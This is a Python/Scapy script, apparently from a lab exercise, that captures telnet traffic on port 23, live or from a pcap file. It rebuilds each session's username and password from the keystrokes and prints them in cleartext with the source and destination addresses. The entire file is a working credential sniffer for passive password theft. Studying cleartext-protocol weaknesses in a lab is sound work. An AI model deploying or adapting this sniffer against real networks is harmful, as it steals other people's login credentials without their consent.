#!/usr/bin/env python3

from scapy.all import *

def render_entry(entry):
    print(f"IP source : {entry['src']} ; IP destination : {entry['dst']} ; Port source : {entry['sport']} ; utilisateur : {entry['user']} ; mot de passe : {entry['password']}")

def telnet_frame(infos, frame):
    if frame.haslayer('Raw') and frame.haslayer('TCP'):
        try:
            car = frame.load.decode('utf-8')
        except:
            return infos

        new_passwd = True
        index = 0
        for i in range(len(infos)):
            if infos[i]['src'] == frame['IP'].src and infos[i]['dst'] == frame['IP'].dst and infos[i]['sport'] == frame.sport:
                if infos[i]['end'] == True:
                    return infos
                new_passwd = False
                index = i
                break

        if frame.sport == 23 and ('login: ' in car and 'Last' not in car or 'identifiant' in car):
            infos.append(
                {
                    'sport': frame.dport,
                    'src': frame['IP'].dst,
                    'dst': frame['IP'].src,
                    'user': '',
                    'end': False
                }
            )

        elif not new_passwd and frame.dport == 23:
            if 'password' in infos[index]:
                if '\r' in car:
                    infos[index]['end'] = True
                elif not infos[index]['end'] and car.encode() == b'\x7f' and len(infos[index]['password']) > 0:
                    infos[index]['password'] = infos[index]['password'][:-1]
                elif not infos[index]['end']:
                    infos[index]['password'] += car
            elif 'user' in infos[index]:
                if '\r' in car:
                    infos[index]['password'] = ''
                elif car.encode() == b'\x7f' and len(infos[index]['user']) > 0:
                    infos[index]['user'] = infos[index]['user'][:-1]
                else:
                    infos[index]['user'] += car
    return infos

def get_telnet_capture(file):
    trames = rdpcap(file)
    passwd = []
    for i in range(len(trames)):
        passwd = telnet_frame(passwd, trames[i])
    return passwd

def telnet_sniff(frame):
    global passwd, last_frame
    if frame == last_frame:
        return None
    passwd = telnet_frame(passwd, frame)
    for i in range(len(passwd)):
        if passwd[i]['end']:
            render_entry(passwd.pop(i))
    last_frame = frame
    return None

if __name__ == "__main__":
    passwd = []
    last_frame = TCP()
    #print(get_telnet_capture("../capture/test_telnet.pcapng"))
    sniff(filter='tcp port 23', prn=telnet_sniff, iface='lo')
